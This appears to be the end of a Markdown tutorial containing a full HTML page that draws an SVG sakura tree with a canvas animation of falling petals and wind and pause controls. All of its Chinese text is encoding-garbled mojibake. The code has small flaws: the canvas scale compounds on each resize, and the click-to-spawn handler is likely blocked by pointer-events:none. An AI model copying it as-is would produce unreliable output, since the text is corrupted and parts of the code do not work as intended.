  <title>æ¨±èŠ±æ ‘ Â· Sakura Tree</title>
  <style>
    :root{
      --bg:#0b1020;
      --ground:#0e1630;
      --tree:#3d291a;
      --petal1:#ffd6e0;
      --petal2:#ffb7d0;
      --blossom:#ffe6f0;
    }

    html,body{
      height:100%;
      margin:0;
      background: linear-gradient(180deg,var(--bg), #0c1220 50%, #07101a 100%);
      color:#fff;
      font-family: "Segoe UI", Roboto, "Helvetica Neue", Arial;
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
      overflow:hidden;
    }

    .wrap{
      display:flex;
      flex-direction:column;
      height:100vh;
      align-items:center;
      justify-content:space-between;
      padding:20px;
      box-sizing:border-box;
    }

    header{
      text-align:center;
      margin-top:6px;
    }
    header h1{
      margin:0;
      font-size:20px;
      letter-spacing:1px;
      opacity:0.95;
    }
    header p{
      margin:6px 0 0 0;
      font-size:13px;
      opacity:0.7;
    }

    .scene{
      position:relative;
      width:100%;
      max-width:1000px;
      height:calc(100vh - 140px);
      display:flex;
      align-items:flex-end;
      justify-content:center;
      pointer-events:none;
    }

    /* Controls */
    .controls{
      position:fixed;
      right:18px;
      top:18px;
      background: rgba(255,255,255,0.06);
      border:1px solid rgba(255,255,255,0.06);
      padding:8px;
      border-radius:10px;
      backdrop-filter: blur(6px);
      pointer-events:auto;
    }
    .controls button{
      display:inline-block;
      background:transparent;
      color:#fff;
      border:1px solid rgba(255,255,255,0.12);
      padding:6px 10px;
      margin:4px;
      border-radius:8px;
      cursor:pointer;
      font-size:13px;
    }
    .controls button.active{
      background: linear-gradient(90deg, rgba(255,182,193,0.18), rgba(255,192,203,0.08));
      border-color: rgba(255,182,193,0.3);
    }

    /* Ground */
    .ground{
      position:absolute;
      bottom:0;
      width:100%;
      height:110px;
      background: linear-gradient(180deg, rgba(10,14,22,0.0), var(--ground));
      box-shadow: inset 0 6px 40px rgba(0,0,0,0.5);
      pointer-events:none;
    }

    /* simple fade-in for page */
    .scene svg, canvas { opacity:0; transform: translateY(10px) scale(0.995); transition: all 700ms cubic-bezier(.2,.9,.2,1); }
    .scene.ready svg, .scene.ready canvas { opacity:1; transform:none; }

    /* subtle sway for tree group */
    @keyframes sway {
      0% { transform: rotate(-1.2deg); }
      50% { transform: rotate(1.4deg); }
      100% { transform: rotate(-1.2deg); }
    }
    .tree-sway {
      transform-origin: 50% 100%;
      animation: sway 6s ease-in-out infinite;
    }

    /* blossom pulse */
    @keyframes blossomPulse {
      0% { transform: scale(0.9); opacity:0.9; }
      50% { transform: scale(1.12); opacity:1; }
      100% { transform: scale(0.9); opacity:0.9; }
    }
    .blossom {
      transform-origin:center;
      animation: blossomPulse 3.2s ease-in-out infinite;
    }

    footer{
      position:fixed;
      left:18px;
      bottom:18px;
      color:rgba(255,255,255,0.6);
      font-size:13px;
      pointer-events:none;
    }

    /* Responsive tweaks */
    @media (max-width:520px){
      header h1 { font-size:16px; }
      .controls { right:10px; top:10px; padding:6px; }
      .controls button{ padding:6px 8px; font-size:12px; }
    }
  </style>
</head>
<body>
  <div class="wrap">
    <header>
      <h1>æ¨±èŠ±æ ‘ Â· Sakura Tree</h1>
      <p>HTML + SVG + Canvasï¼šè½»æŸ”æ‘‡æ›³ä¸é£˜è½æ¨±èŠ±ç“£ âœ¨</p>
    </header>

    <div class="scene" id="scene">
      <!-- SVG æ ‘ä¸é™æ€èŠ± -->
      <svg id="sakuraSVG" viewBox="0 0 800 600" preserveAspectRatio="xMidYMax meet" style="width:100%; height:100%;">
        <!-- èƒŒæ™¯æ·¡è‰²é›¾ -->
        <defs>
          <radialGradient id="skyGlow" cx="50%" cy="30%" r="60%">
            <stop offset="0%" stop-color="#fff7f9" stop-opacity="0.06"/>
            <stop offset="60%" stop-color="#ffdff0" stop-opacity="0.02"/>
            <stop offset="100%" stop-color="#000000" stop-opacity="0"/>
          </radialGradient>
          <filter id="soft" x="-50%" y="-50%" width="200%" height="200%">
            <feGaussianBlur stdDeviation="2" result="b"/>
            <feBlend in="SourceGraphic" in2="b"/>
          </filter>
        </defs>

        <rect x="0" y="0" width="800" height="600" fill="url(#skyGlow)"/>

        <!-- æ ‘å¹²ä¸ä¸»æï¼ˆä½¿ç”¨ path ç»˜åˆ¶ï¼‰ -->
        <g id="tree" class="tree-sway" transform="translate(410, 560) scale(1,-1)">
          <!-- ä¸»å¹² -->
          <path d="M10 0 C 40 0, 60 40, 60 80 C 60 140, 55 190, 40 240 C 25 290, 15 330, 0 350
                   C -10 360, -20 380, -32 395 C -40 405, -45 415, -48 430 C -52 455, -45 480, -30 490
                   C -10 507, 30 520, 80 520 C 120 520, 135 510, 150 500"
                fill="none" stroke="#3b281a" stroke-width="24" stroke-linecap="round" stroke-linejoin="round" />
          <!-- ç»†æ -->
          <path d="M80 500 C 110 470, 170 440, 200 420" fill="none" stroke="#3b281a" stroke-width="12" stroke-linecap="round" />
          <path d="M40 520 C 20 480, -30 430, -90 390" fill="none" stroke="#3b281a" stroke-width="10" stroke-linecap="round" />
          <path d="M0 350 C -40 320, -100 290, -160 270" fill="none" stroke="#3b281a" stroke-width="8" stroke-linecap="round" />

          <!-- ä¸€äº›è¾ƒç²—çš„ææ¡å¡«è‰²ï¼ˆåˆ¶é€ æ›´ç«‹ä½“çš„æ•ˆæœï¼‰ -->
          <path d="M10 0 C 40 0, 60 40, 60 80 C 60 140, 55 190, 40 240 C 25 290, 15 330, 0 350
                   C -10 360, -20 380, -32 395 C -40 405, -45 415, -48 430 C -52 455, -45 480, -30 490
                   C -10 507, 30 520, 80 520 C 120 520, 135 510, 150 500"
                fill="none" stroke="#2f1e15" stroke-width="6" stroke-linecap="round" stroke-linejoin="round" opacity="0.85" />

          <!-- èŠ±ç°‡ï¼ˆç”¨ circle + path æ¨¡æ‹Ÿï¼‰ -->
          <!-- cluster left -->
          <g transform="translate(-160,270) rotate(-12)">
            <circle class="blossom" cx="0" cy="0" r="10" fill="#fff0f6" opacity="0.95"/>
            <circle cx="8" cy="-6" r="7" fill="#ffd6e9" opacity="0.95"/>
            <circle cx="-9" cy="-4" r="6" fill="#ffcce0" opacity="0.95"/>
          </g>

          <!-- cluster center -->
          <g transform="translate(120,450) rotate(8)">
            <circle class="blossom" cx="0" cy="0" r="12" fill="#fff2f7" opacity="0.95"/>
            <circle cx="-10" cy="6" r="8" fill="#ffd6e9" opacity="0.95"/>
            <circle cx="12" cy="6" r="7" fill="#ffb7d8" opacity="0.95"/>
          </g>

          <!-- cluster right -->
          <g transform="translate(230,420) rotate(20)">
            <circle class="blossom" cx="0" cy="0" r="9" fill="#fff2f7" opacity="0.95"/>
            <circle cx="9" cy="5" r="7" fill="#ffd6e9" opacity="0.95"/>
            <circle cx="-7" cy="4" r="6" fill="#ffcce0" opacity="0.95"/>
          </g>

          <!-- more small blossoms sprinkled -->
          <g>
            <circle class="blossom" cx="190" cy="360" r="6" fill="#ffecf4" />
            <circle class="blossom" cx="150" cy="300" r="7" fill="#ffd6e9" />
            <circle class="blossom" cx="60"  cy="260" r="6" fill="#ffecf4" />
            <circle class="blossom" cx="-30" cy="310" r="6" fill="#ffb7d8" />
            <circle class="blossom" cx="-90" cy="350" r="5" fill="#ffd6e9" />
          </g>
        </g>
      </svg>

      <!-- Canvas ç”¨äºæ¨±èŠ±ç“£ç²’å­é£˜è½ï¼ˆä½äº SVG ä¹‹ä¸Šï¼Œä»¥ä¾¿ç‹¬ç«‹æ§åˆ¶ï¼‰ -->
      <canvas id="petalCanvas" style="position:absolute; left:0; top:0; width:100%; height:100%;"></canvas>

      <div class="ground"></div>
    </div>

    <div class="controls" id="controls">
      <button id="toggleFall" class="active">å¼€ / å…³ é£˜è½</button>
      <button id="moreWind">å¾®é£ â†‘</button>
      <button id="lessWind">å¾®é£ â†“</button>
    </div>

    <footer>Tip: ç‚¹å‡»â€œå¼€ / å…³ é£˜è½â€å¯ä»¥æš‚åœæˆ–æ¢å¤æ¨±èŠ±é£˜è½ã€‚</footer>
  </div>

  <script>
    // ç­‰é¡µé¢æ¸²æŸ“åŠ¨ç”»å®Œæˆåæ˜¾ç¤º
    window.addEventListener('load', ()=> {
      document.getElementById('scene').classList.add('ready');
    });

    /* ------------- Petal particle system ------------- */
    (function(){
      const canvas = document.getElementById('petalCanvas');
      const ctx = canvas.getContext('2d', { alpha: true });
      let W = canvas.width = canvas.offsetWidth;
      let H = canvas.height = canvas.offsetHeight;
      let petals = [];
      let isFalling = true;
      let wind = 0.6; // æ­£ä¸ºå‘å³ï¼Œè´Ÿä¸ºå‘å·¦

      // handle resizing
      function resize(){
        // maintain device pixel ratio
        const ratio = window.devicePixelRatio || 1;
        W = canvas.width = canvas.offsetWidth * ratio;
        H = canvas.height = canvas.offsetHeight * ratio;
        canvas.style.width = canvas.offsetWidth + 'px';
        canvas.style.height = canvas.offsetHeight + 'px';
        ctx.scale(ratio, ratio);
      }
      new ResizeObserver(resize).observe(canvas);
      resize();

      // random helpers
      const rand = (min, max) => Math.random() * (max - min) + min;
      const clamp = (v, a, b) => Math.max(a, Math.min(b, v));

      // create a petal
      function createPetal(overX) {
        const size = rand(8, 18);
        const x = overX !== undefined ? overX : rand(0, canvas.offsetWidth);
        const y = -10;
        const rot = rand(0, Math.PI * 2);
        const spin = rand(-0.02, 0.02);
        const sway = rand(0.5, 1.6);
        const fallSpeed = rand(20, 80); // px / second baseline
        const color = Math.random() > 0.5 ? '#ffd6e9' : '#ffb7d8';
        const opacity = rand(0.75, 1);
        return { x, y, size, rot, spin, sway, fallSpeed, color, opacity, life:0 };
      }

      // spawn loop
      function spawnBurst(n=1, x) {
        for (let i=0;i<n;i++){
          petals.push(createPetal(x));
        }
      }

      // initial petals
      for (let i=0;i<20;i++) spawnBurst(1);

      // draw a single petal (ellipse-like)
      function drawPetal(p, dt){
        ctx.save();
        ctx.globalAlpha = clamp(p.opacity * (1 - p.life / 100), 0, 1);
        ctx.translate(p.x, p.y);
        ctx.rotate(p.rot);
        // petal shape - slightly asymmetrical
        ctx.beginPath();
        ctx.moveTo(0, 0);
        ctx.bezierCurveTo(p.size*0.6, -p.size*0.2, p.size*0.9, p.size*0.6, 0, p.size);
        ctx.bezierCurveTo(-p.size*0.9, p.size*0.6, -p.size*0.6, -p.size*0.2, 0, 0);
        ctx.fillStyle = p.color;
        ctx.fill();
        // center dot for depth
        ctx.beginPath();
        ctx.arc(0, p.size*0.5, p.size*0.12, 0, Math.PI*2);
        ctx.fillStyle = 'rgba(255,200,230,0.6)';
        ctx.fill();
        ctx.restore();
      }

      // update and render
      let last = performance.now();
      function tick(now){
        const delta = (now - last) / 1000; // seconds
        last = now;
        ctx.clearRect(0,0, canvas.offsetWidth, canvas.offsetHeight);

        // maybe spawn new petals occasionally when falling is on
        if (isFalling && Math.random() < 0.6) {
          spawnBurst(Math.random() < 0.5 ? 1 : 0); // less bursty by default
        }

        // update
        for (let i = petals.length - 1; i >= 0; i--) {
          const p = petals[i];
          // horizontal sway (sinusoidal) + wind
          p.life += delta * 10;
          p.x += (Math.sin(p.life * p.sway) * 14 * delta) + wind * delta * 30;
          // gravity
          p.y += p.fallSpeed * delta + Math.abs(Math.cos(p.life*0.5)) * 6 * delta;
          // rotation
          p.rot += p.spin * (0.5 + Math.abs(wind) * 0.5);
          // fade when below ground
          if (p.y > canvas.offsetHeight + 40 || p.life > 220) {
            petals.splice(i,1);
            continue;
          }
          drawPetal(p, delta);
        }

        requestAnimationFrame(tick);
      }
      requestAnimationFrame(tick);

      // UI bindings
      const toggleBtn = document.getElementById('toggleFall');
      const moreWindBtn = document.getElementById('moreWind');
      const lessWindBtn = document.getElementById('lessWind');

      toggleBtn.addEventListener('click', ()=>{
          console.log('toggle');
        isFalling = !isFalling;
        toggleBtn.classList.toggle('active', isFalling);
        toggleBtn.textContent = isFalling ? 'å¼€ / å…³ é£˜è½' : 'å·²æš‚åœé£˜è½';
      });
      moreWindBtn.addEventListener('click', ()=> { wind += 0.3; wind = clamp(wind, -2.5, 2.5); spawnBurst(8); });
      lessWindBtn.addEventListener('click', ()=> { wind -= 0.3; wind = clamp(wind, -2.5, 2.5); spawnBurst(8); });

      // add interactive spawn: click on SVG to emit petals from that point
      const svg = document.getElementById('sakuraSVG');
      svg.addEventListener('pointerdown', (e)=>{
        const rect = svg.getBoundingClientRect();
        const x = e.clientX - rect.left;
        spawnBurst(12, x);
      });

      // small ambient continuous spawn from branches
      setInterval(()=> {
        if (isFalling) spawnBurst(Math.random() < 0.6 ? 1 : 0);
      }, 420);

      // expose some debug controls if needed (optional)
      window.__sakura = {
        spawnBurst, petalsArr: petals, setWind: v=> wind = v
      };
    })();
  </script>
</body>
</html>
```

## æœ€ç»ˆæ•ˆæœ

![image-20251014152949971](16.æ—¶é—´å‚æ•°ä¼ é€’åŠæ’ä»¶æ¨¡æ¿2.0.assets/image-20251014152949971.png)